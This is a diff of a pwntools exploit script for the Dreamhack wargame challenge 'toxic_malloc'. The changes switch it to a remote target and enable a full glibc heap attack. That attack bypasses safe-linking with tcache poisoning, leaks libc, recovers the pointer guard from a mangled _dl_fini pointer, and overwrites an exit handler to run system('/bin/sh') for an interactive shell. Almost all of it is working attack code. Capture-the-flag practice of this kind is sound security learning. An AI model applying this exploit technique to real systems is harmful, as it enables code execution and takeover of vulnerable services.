@@ -1,7 +1,7 @@
 from pwn import *
 
 context.log_level = 'warn'
-context.terminal = ['tmux', 'new-window']
+# context.terminal = ['tmux', 'new-window']
 
 def safe_link(pos, ptr):
       return (pos >> 12) ^ ptr
@@ -46,12 +46,12 @@ def delete(idx):
 def exit():
   rem.sendlineafter(b'choice:', b"5")
 
-ld = "/home/hibrian827/Wargame/Dreamhack/Pwnable/toxic_malloc/problem/deploy/ld-linux-x86-64.so.2"
-env = {"LD_PRELOAD": "/home/hibrian827/Wargame/Dreamhack/Pwnable/toxic_malloc/problem/deploy/libc.so.6"}
-rem = process(["./Pwnable/toxic_malloc/problem/deploy/chall"], env=env)
+# ld = "/home/hibrian827/Wargame/Dreamhack/Pwnable/toxic_malloc/problem/deploy/ld-linux-x86-64.so.2"
+# env = {"LD_PRELOAD": "/home/hibrian827/Wargame/Dreamhack/Pwnable/toxic_malloc/problem/deploy/libc.so.6"}
+# rem = process([ld, "./Pwnable/toxic_malloc/problem/deploy/chall"], env=env)
 
-# port = 31337
-# rem = remote("0.0.0.0", port)
+port = 31337
+rem = remote("0.0.0.0", port)
 
 lib = ELF("./Pwnable/toxic_malloc/problem/deploy/libc.so.6")
 
@@ -71,31 +71,31 @@ for i in range(1, 7):
 
 lib_base = u64(read(0).rstrip().ljust(8, b'\x00')) - 0x21ace0
 initial = lib_base + 0x21bf00
-dl_fini_addr = lib_base + 0x0
+
+dl_fini_addr = lib_base + 0x234000 + 0x6040
 sys_addr = lib_base + lib.symbols['system']
-binsh_addr = lib_base + next(lib.search("/bin/sh"))
+binsh_addr = lib_base + next(lib.search(b"/bin/sh"))
 
 print(hex(lib_base))
 print(hex(initial))
 print(hex(sys_addr))
 print(hex(binsh_addr))
 
-# update(0, p64(safe_link(heap_base+0x2a0, heap_base+0x2a0)))
-# create(2, p64(safe_link(heap_base+0x2a0, initial)))
-# create(3, b"B" * 16)
-# payload = b"C" * 0x18
-# create(4, payload)
+update(0, p64(safe_link(heap_base+0x2a0, heap_base+0x2a0)))
+create(2, p64(safe_link(heap_base+0x2a0, initial)))
+create(3, b"B" * 16)
+payload = b"C" * 0x18
+create(4, payload)
 
-# mangle_dl_fini = u64(read(4, payload).rstrip().ljust(8, b'\x00'))
-# pointer_gaurd = ror(mangle_dl_fini, 0x11, word_size=64) ^ dl_fini_addr
-# print(hex(pointer_gaurd))
-# print(p64(rol(gadget_addr, 0x11, word_size=64)))
-# update(4, p64(4) + p64(rol(gadget_addr, 0x11, word_size=64) ^ pointer_gaurd))
 
-gdb.attach(rem)
+mangle_dl_fini = u64(read(4, payload).rstrip().ljust(8, b'\x00'))
+print(hex(mangle_dl_fini))
+pointer_gaurd = ror(mangle_dl_fini, 0x11, word_size=64) ^ dl_fini_addr
+print(hex(pointer_gaurd))
+update(4, p64(4) + p64(rol(sys_addr ^ pointer_gaurd, 0x11, word_size=64)) + p64(binsh_addr))
+
+# gdb.attach(rem)
 
 exit()
-
-rem.recvline()
 
 rem.interactive()
